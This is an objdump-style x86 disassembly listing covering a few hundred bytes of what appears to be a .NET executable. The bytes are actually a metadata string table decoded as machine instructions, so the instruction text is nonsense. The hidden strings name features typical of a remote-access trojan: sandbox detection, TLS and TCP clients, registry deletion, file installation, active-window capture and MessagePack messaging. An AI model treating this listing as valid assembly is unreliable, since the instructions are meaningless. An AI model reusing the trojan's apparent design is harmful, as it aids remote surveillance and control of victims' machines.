  407c49:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4a:	67 46                	addr16 inc %esi
  407c4c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c53:	75 66                	jne    0x407cbb
  407c55:	66 65 72 3e          	data16 gs jb 0x407c97
  407c59:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c5d:	61                   	popa
  407c5e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c61:	6e                   	outsb  %ds:(%esi),(%dx)
  407c62:	67 46                	addr16 inc %esi
  407c64:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c6b:	66 66 73 65          	data16 data16 jae 0x407cd4
  407c6f:	74 3e                	je     0x407caf
  407c71:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c75:	61                   	popa
  407c76:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c79:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7a:	67 46                	addr16 inc %esi
  407c7c:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c83:	73 6c                	jae    0x407cf1
  407c85:	43                   	inc    %ebx
  407c86:	6c                   	insb   (%dx),%es:(%edi)
  407c87:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c8e:	5f                   	pop    %edi
  407c8f:	42                   	inc    %edx
  407c90:	61                   	popa
  407c91:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c94:	6e                   	outsb  %ds:(%esi),(%dx)
  407c95:	67 46                	addr16 inc %esi
  407c97:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407c9e:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca1:	6c                   	insb   (%dx),%es:(%edi)
  407ca2:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407ca9:	5f                   	pop    %edi
  407caa:	42                   	inc    %edx
  407cab:	61                   	popa
  407cac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407caf:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb0:	67 46                	addr16 inc %esi
  407cb2:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cba:	65 72 41             	gs jb  0x407cfe
  407cbd:	64 64 4d             	fs fs dec %ebp
  407cc0:	61                   	popa
  407cc1:	70 43                	jo     0x407d06
  407cc3:	68 69 6c 64 00       	push   $0x646c69
  407cc8:	49                   	dec    %ecx
  407cc9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cca:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccb:	65 72 41             	gs jb  0x407d0f
  407cce:	64 64 41             	fs fs inc %ecx
  407cd1:	72 72                	jb     0x407d45
  407cd3:	61                   	popa
  407cd4:	79 43                	jns    0x407d19
  407cd6:	68 69 6c 64 00       	push   $0x646c69
  407cdb:	68 57 6e 64 00       	push   $0x646e57
  407ce0:	53                   	push   %ebx
  407ce1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ce3:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407ce7:	70 65                	jo     0x407d4e
  407ce9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cea:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cee:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cf5:	61 
  407cf6:	6c                   	insb   (%dx),%es:(%edi)
  407cf7:	75 65                	jne    0x407d5e
  407cf9:	4b                   	dec    %ebx
  407cfa:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d01:	6c                   	insb   (%dx),%es:(%edi)
  407d02:	61                   	popa
  407d03:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d06:	43                   	inc    %ebx
  407d07:	72 65                	jb     0x407d6e
  407d09:	61                   	popa
  407d0a:	74 65                	je     0x407d71
  407d0c:	49                   	dec    %ecx
  407d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0e:	73 74                	jae    0x407d84
  407d10:	61                   	popa
  407d11:	6e                   	outsb  %ds:(%esi),(%dx)
  407d12:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d15:	73 65                	jae    0x407d7c
  407d17:	74 5f                	je     0x407d78
  407d19:	4d                   	dec    %ebp
  407d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1b:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d20:	6c                   	insb   (%dx),%es:(%edi)
  407d21:	65 4d                	gs dec %ebp
  407d23:	6f                   	outsl  %ds:(%esi),(%dx)
  407d24:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d29:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d30:	64 65 
  407d32:	00 45 6e             	add    %al,0x6e(%ebp)
  407d35:	74 65                	je     0x407d9c
  407d37:	72 44                	jb     0x407d7d
  407d39:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d3d:	4d                   	dec    %ebp
  407d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3f:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d44:	79 70                	jns    0x407db6
  407d46:	74 6f                	je     0x407db7
  407d48:	53                   	push   %ebx
  407d49:	74 72                	je     0x407dbd
  407d4b:	65 61                	gs popa
  407d4d:	6d                   	insl   (%dx),%es:(%edi)
  407d4e:	4d                   	dec    %ebp
  407d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d50:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	70 72                	jo     0x407dca
  407d58:	65 73 73             	gs jae 0x407dce
  407d5b:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d62:	00 43 69             	add    %al,0x69(%ebx)
  407d65:	70 68                	jo     0x407dcf
  407d67:	65 72 4d             	gs jb  0x407db7
  407d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6b:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d70:	6c                   	insb   (%dx),%es:(%edi)
  407d71:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d76:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d7b:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d7f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d82:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d87:	65 74 65             	gs je  0x407def
  407d8a:	53                   	push   %ebx
  407d8b:	75 62                	jne    0x407def
  407d8d:	4b                   	dec    %ebx
  407d8e:	65 79 54             	gs jns 0x407de5
  407d91:	72 65                	jb     0x407df8
  407d93:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d97:	74 5f                	je     0x407df8
  407d99:	4d                   	dec    %ebp
  407d9a:	65 73 73             	gs jae 0x407e10
  407d9d:	61                   	popa
  407d9e:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407da3:	74 65                	je     0x407e0a
  407da5:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407da9:	6e                   	outsb  %ds:(%esi),(%dx)
  407daa:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dae:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407db5:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407db9:	45                   	inc    %ebp
  407dba:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbb:	75 6d                	jne    0x407e2a
  407dbd:	65 72 61             	gs jb  0x407e21
  407dc0:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dc4:	49                   	dec    %ecx
  407dc5:	44                   	inc    %esp
  407dc6:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dcd:	6c                   	insb   (%dx),%es:(%edi)
  407dce:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407dd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd4:	75 62                	jne    0x407e38
  407dd6:	6c                   	insb   (%dx),%es:(%edi)
  407dd7:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407ddb:	61                   	popa
  407ddc:	70 44                	jo     0x407e22
  407dde:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddf:	75 62                	jne    0x407e43
  407de1:	6c                   	insb   (%dx),%es:(%edi)
  407de2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407de6:	74 5f                	je     0x407e47
  407de8:	48                   	dec    %eax
  407de9:	61                   	popa
  407dea:	6e                   	outsb  %ds:(%esi),(%dx)
  407deb:	64 6c                	fs insb (%dx),%es:(%edi)
  407ded:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df1:	6e                   	outsb  %ds:(%esi),(%dx)
  407df2:	74 69                	je     0x407e5d
  407df4:	6d                   	insl   (%dx),%es:(%edi)
  407df5:	65 46                	gs inc %esi
  407df7:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407dfe:	64 6c                	fs insb (%dx),%es:(%edi)
  407e00:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e04:	74 4d                	je     0x407e53
  407e06:	6f                   	outsl  %ds:(%esi),(%dx)
  407e07:	64 75 6c             	fs jne 0x407e76
  407e0a:	65 48                	gs dec %eax
  407e0c:	61                   	popa
  407e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0e:	64 6c                	fs insb (%dx),%es:(%edi)
  407e10:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e14:	6e                   	outsb  %ds:(%esi),(%dx)
  407e15:	74 69                	je     0x407e80
  407e17:	6d                   	insl   (%dx),%es:(%edi)
  407e18:	65 54                	gs push %esp
  407e1a:	79 70                	jns    0x407e8c
  407e1c:	65 48                	gs dec %eax
  407e1e:	61                   	popa
  407e1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e20:	64 6c                	fs insb (%dx),%es:(%edi)
  407e22:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e26:	74 54                	je     0x407e7c
  407e28:	79 70                	jns    0x407e9a
  407e2a:	65 46                	gs inc %esi
  407e2c:	72 6f                	jb     0x407e9d
  407e2e:	6d                   	insl   (%dx),%es:(%edi)
  407e2f:	48                   	dec    %eax
  407e30:	61                   	popa
  407e31:	6e                   	outsb  %ds:(%esi),(%dx)
  407e32:	64 6c                	fs insb (%dx),%es:(%edi)
  407e34:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e38:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e3f:	65 
  407e40:	00 57 72             	add    %dl,0x72(%edi)
  407e43:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e4a:	6c 
  407e4b:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e50:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e57:	65 74 41             	gs je  0x407e9b
  407e5a:	73 53                	jae    0x407eaf
  407e5c:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e63:	6e                   	outsb  %ds:(%esi),(%dx)
  407e64:	73 74                	jae    0x407eda
  407e66:	61                   	popa
  407e67:	6c                   	insb   (%dx),%es:(%edi)
  407e68:	6c                   	insb   (%dx),%es:(%edi)
  407e69:	46                   	inc    %esi
  407e6a:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e71:	6f 
  407e72:	64 65 46             	fs gs inc %esi
  407e75:	72 6f                	jb     0x407ee6
  407e77:	6d                   	insl   (%dx),%es:(%edi)
  407e78:	46                   	inc    %esi
  407e79:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e80:	65 
  407e81:	42                   	inc    %edx
  407e82:	79 74                	jns    0x407ef8
  407e84:	65 73 54             	gs jae 0x407edb
  407e87:	6f                   	outsl  %ds:(%esi),(%dx)
  407e88:	46                   	inc    %esi
  407e89:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e90:	6e 
  407e91:	52                   	push   %edx
  407e92:	6f                   	outsl  %ds:(%esi),(%dx)
  407e93:	6c                   	insb   (%dx),%es:(%edi)
  407e94:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407e98:	6e                   	outsb  %ds:(%esi),(%dx)
  407e99:	64 6f                	outsl  %fs:(%esi),(%dx)
  407e9b:	77 73                	ja     0x407f10
  407e9d:	42                   	inc    %edx
  407e9e:	75 69                	jne    0x407f09
  407ea0:	6c                   	insb   (%dx),%es:(%edi)
  407ea1:	74 49                	je     0x407eec
  407ea3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea4:	52                   	push   %edx
  407ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea6:	6c                   	insb   (%dx),%es:(%edi)
  407ea7:	65 00 41 70          	add    %al,%gs:0x70(%ecx)
  407eab:	70 6c                	jo     0x407f19
  407ead:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb1:	74 41                	je     0x407ef4
  407eb3:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb7:	65 57                	gs push %edi
  407eb9:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec0:	74 6c                	je     0x407f2e
  407ec2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec6:	74 5f                	je     0x407f27
  407ec8:	4d                   	dec    %ebp
  407ec9:	61                   	popa
  407eca:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed1:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed6:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ed9:	73 4d                	jae    0x407f28
  407edb:	6f                   	outsl  %ds:(%esi),(%dx)
  407edc:	64 75 6c             	fs jne 0x407f4b
  407edf:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee3:	74 5f                	je     0x407f44
  407ee5:	57                   	push   %edi
  407ee6:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407eed:	79 6c                	jns    0x407f5b
  407eef:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef4:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef7:	73 57                	jae    0x407f50
  407ef9:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f00:	79 6c                	jns    0x407f6e
  407f02:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f06:	74 5f                	je     0x407f67
  407f08:	4e                   	dec    %esi
  407f09:	61                   	popa
  407f0a:	6d                   	insl   (%dx),%es:(%edi)
  407f0b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f0f:	74 5f                	je     0x407f70
  407f11:	46                   	inc    %esi
  407f12:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f19:	00 
  407f1a:	73 65                	jae    0x407f81
  407f1c:	74 5f                	je     0x407f7d
  407f1e:	46                   	inc    %esi
  407f1f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f26:	00 
  407f27:	47                   	inc    %edi
  407f28:	65 74 54             	gs je  0x407f7f
  407f2b:	65 6d                	gs insl (%dx),%es:(%edi)
  407f2d:	70 46                	jo     0x407f75
  407f2f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f36:	00 
  407f37:	47                   	inc    %edi
  407f38:	65 74 46             	gs je  0x407f81
  407f3b:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f42:	00 
  407f43:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4a:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407f50:	64 75 6c             	fs jne 0x407fbf
  407f53:	65 4e                	gs dec %esi
  407f55:	61                   	popa
  407f56:	6d                   	insl   (%dx),%es:(%edi)
  407f57:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5b:	74 5f                	je     0x407fbc
  407f5d:	4d                   	dec    %ebp
  407f5e:	61                   	popa
  407f5f:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f62:	6e                   	outsb  %ds:(%esi),(%dx)
  407f63:	65 4e                	gs dec %esi
  407f65:	61                   	popa
  407f66:	6d                   	insl   (%dx),%es:(%edi)
  407f67:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6b:	74 5f                	je     0x407fcc
  407f6d:	4f                   	dec    %edi
  407f6e:	53                   	push   %ebx
  407f6f:	46                   	inc    %esi
  407f70:	75 6c                	jne    0x407fde
  407f72:	6c                   	insb   (%dx),%es:(%edi)
  407f73:	4e                   	dec    %esi
  407f74:	61                   	popa
  407f75:	6d                   	insl   (%dx),%es:(%edi)
  407f76:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7a:	74 5f                	je     0x407fdb
  407f7c:	46                   	inc    %esi
  407f7d:	75 6c                	jne    0x407feb
  407f7f:	6c                   	insb   (%dx),%es:(%edi)
  407f80:	4e                   	dec    %esi
  407f81:	61                   	popa
  407f82:	6d                   	insl   (%dx),%es:(%edi)
  407f83:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f87:	56                   	push   %esi
  407f88:	61                   	popa
  407f89:	6c                   	insb   (%dx),%es:(%edi)
  407f8a:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f91:	6e 
  407f92:	4e                   	dec    %esi
  407f93:	61                   	popa
  407f94:	6d                   	insl   (%dx),%es:(%edi)
  407f95:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f99:	74 5f                	je     0x407ffa
  407f9b:	55                   	push   %ebp
  407f9c:	73 65                	jae    0x408003
  407f9e:	72 4e                	jb     0x407fee
  407fa0:	61                   	popa
  407fa1:	6d                   	insl   (%dx),%es:(%edi)
  407fa2:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa7:	65 72 4e             	gs jb  0x407ff8
  407faa:	61                   	popa
  407fab:	6d                   	insl   (%dx),%es:(%edi)
  407fac:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb0:	74 4e                	je     0x408000
  407fb2:	61                   	popa
  407fb3:	6d                   	insl   (%dx),%es:(%edi)
  407fb4:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fb8:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407fbd:	73 74                	jae    0x408033
  407fbf:	4e                   	dec    %esi
  407fc0:	61                   	popa
  407fc1:	6d                   	insl   (%dx),%es:(%edi)
  407fc2:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc6:	6d                   	insl   (%dx),%es:(%edi)
  407fc7:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fcc:	65 54                	gs push %esp
  407fce:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd5:	5f                   	pop    %edi
  407fd6:	4c                   	dec    %esp
  407fd7:	61                   	popa
  407fd8:	73 74                	jae    0x40804e
  407fda:	57                   	push   %edi
  407fdb:	72 69                	jb     0x408046
  407fdd:	74 65                	je     0x408044
  407fdf:	54                   	push   %esp
  407fe0:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe7:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe8:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407fef:	54                   	push   %esp
  407ff0:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff7:	74 65                	je     0x40805e
  407ff9:	4c                   	dec    %esp
  407ffa:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408001:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408004:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408008:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  40800f:	6d                   	insl   (%dx),%es:(%edi)
  408010:	65 54                	gs push %esp
  408012:	79 70                	jns    0x408084
  408014:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408018:	74 5f                	je     0x408079
  40801a:	56                   	push   %esi
  40801b:	61                   	popa
  40801c:	6c                   	insb   (%dx),%es:(%edi)
  40801d:	75 65                	jne    0x408084
  40801f:	54                   	push   %esp
  408020:	79 70                	jns    0x408092
  408022:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408026:	6c                   	insb   (%dx),%es:(%edi)
  408027:	75 65                	jne    0x40808e
  408029:	54                   	push   %esp
  40802a:	79 70                	jns    0x40809c
  40802c:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408030:	67 50                	addr16 push %eax
  408032:	61                   	popa
  408033:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408036:	79 70                	jns    0x4080a8
  408038:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803c:	6f                   	outsl  %ds:(%esi),(%dx)
  40803d:	74 6f                	je     0x4080ae
  40803f:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408042:	54                   	push   %esp
  408043:	79 70                	jns    0x4080b5
  408045:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408049:	74 54                	je     0x40809f
  40804b:	79 70                	jns    0x4080bd
  40804d:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408051:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408054:	74 54                	je     0x4080aa
  408056:	79 70                	jns    0x4080c8
  408058:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805c:	6c                   	insb   (%dx),%es:(%edi)
  40805d:	65 53                	gs push %ebx
  40805f:	68 61 72 65 00       	push   $0x657261
  408064:	53                   	push   %ebx
  408065:	79 73                	jns    0x4080da
  408067:	74 65                	je     0x4080ce
  408069:	6d                   	insl   (%dx),%es:(%edi)
  40806a:	2e 43                	cs inc %ebx
  40806c:	6f                   	outsl  %ds:(%esi),(%dx)
  40806d:	72 65                	jb     0x4080d4
  40806f:	00 53 65             	add    %dl,0x65(%ebx)
  408072:	72 76                	jb     0x4080ea
  408074:	65 72 73             	gs jb  0x4080ea
  408077:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  40807e:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408082:	6f                   	outsl  %ds:(%esi),(%dx)
  408083:	73 65                	jae    0x4080ea
  408085:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408089:	70 6f                	jo     0x4080fa
  40808b:	73 65                	jae    0x4080f2
  40808d:	00 50 61             	add    %dl,0x61(%eax)
  408090:	72 73                	jb     0x408105
  408092:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408096:	72 52                	jb     0x4080ea
  408098:	65 76 65             	gs jbe 0x408100
  40809b:	72 73                	jb     0x408110
  40809d:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a1:	30 39                	xor    %bh,(%ecx)
  4080a3:	43                   	inc    %ebx
  4080a4:	65 72 74             	gs jb  0x40811b
  4080a7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ae:	00 56 61             	add    %dl,0x61(%esi)
  4080b1:	6c                   	insb   (%dx),%es:(%edi)
  4080b2:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080b9:	72 
  4080ba:	76 65                	jbe    0x408121
  4080bc:	72 43                	jb     0x408101
  4080be:	65 72 74             	gs jb  0x408135
  4080c1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080c8:	00 63 65             	add    %ah,0x65(%ebx)
  4080cb:	72 74                	jb     0x408141
  4080cd:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d4:	00 43 72             	add    %al,0x72(%ebx)
  4080d7:	65 61                	gs popa
  4080d9:	74 65                	je     0x408140
  4080db:	00 53 65             	add    %dl,0x65(%ebx)
  4080de:	74 54                	je     0x408134
  4080e0:	68 72 65 61 64       	push   $0x64616572
  4080e5:	45                   	inc    %ebp
  4080e6:	78 65                	js     0x40814d
  4080e8:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080eb:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f2:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f7:	65 74 65             	gs je  0x40815f
  4080fa:	00 43 61             	add    %al,0x61(%ebx)
  4080fd:	6c                   	insb   (%dx),%es:(%edi)
  4080fe:	6c                   	insb   (%dx),%es:(%edi)
  4080ff:	53                   	push   %ebx
  408100:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408107:	74 
  408108:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810c:	6d                   	insl   (%dx),%es:(%edi)
  40810d:	70 69                	jo     0x408178
  40810f:	6c                   	insb   (%dx),%es:(%edi)
  408110:	65 72 47             	gs jb  0x40815a
  408113:	65 6e                	outsb  %gs:(%esi),(%dx)
  408115:	65 72 61             	gs jb  0x408179
  408118:	74 65                	je     0x40817f
  40811a:	64 41                	fs inc %ecx
  40811c:	74 74                	je     0x408192
  40811e:	72 69                	jb     0x408189
  408120:	62 75 74             	bound  %esi,0x74(%ebp)
  408123:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408128:	75 67                	jne    0x408191
  40812a:	67 61                	addr16 popa
  40812c:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408130:	74 74                	je     0x4081a6
  408132:	72 69                	jb     0x40819d
  408134:	62 75 74             	bound  %esi,0x74(%ebp)
  408137:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813b:	6d                   	insl   (%dx),%es:(%edi)
  40813c:	56                   	push   %esi
  40813d:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408144:	74 74                	je     0x4081ba
  408146:	72 69                	jb     0x4081b1
  408148:	62 75 74             	bound  %esi,0x74(%ebp)
  40814b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40814f:	73 65                	jae    0x4081b6
  408151:	6d                   	insl   (%dx),%es:(%edi)
  408152:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408156:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40815d:	72 
  40815e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408165:	73 73                	jae    0x4081da
  408167:	65 6d                	gs insl (%dx),%es:(%edi)
  408169:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40816d:	72 61                	jb     0x4081d0
  40816f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408172:	61                   	popa
  408173:	72 6b                	jb     0x4081e0
  408175:	41                   	inc    %ecx
  408176:	74 74                	je     0x4081ec
  408178:	72 69                	jb     0x4081e3
  40817a:	62 75 74             	bound  %esi,0x74(%ebp)
  40817d:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408182:	67 65 74 46          	addr16 gs je 0x4081cc
  408186:	72 61                	jb     0x4081e9
  408188:	6d                   	insl   (%dx),%es:(%edi)
  408189:	65 77 6f             	gs ja  0x4081fb
  40818c:	72 6b                	jb     0x4081f9
  40818e:	41                   	inc    %ecx
  40818f:	74 74                	je     0x408205
  408191:	72 69                	jb     0x4081fc
  408193:	62 75 74             	bound  %esi,0x74(%ebp)
  408196:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819a:	73 65                	jae    0x408201
  40819c:	6d                   	insl   (%dx),%es:(%edi)
  40819d:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a1:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081a8:	69 
  4081a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4081aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ab:	41                   	inc    %ecx
  4081ac:	74 74                	je     0x408222
  4081ae:	72 69                	jb     0x408219
  4081b0:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b7:	73 65                	jae    0x40821e
  4081b9:	6d                   	insl   (%dx),%es:(%edi)
  4081ba:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081be:	6f                   	outsl  %ds:(%esi),(%dx)
  4081bf:	6e                   	outsb  %ds:(%esi),(%dx)
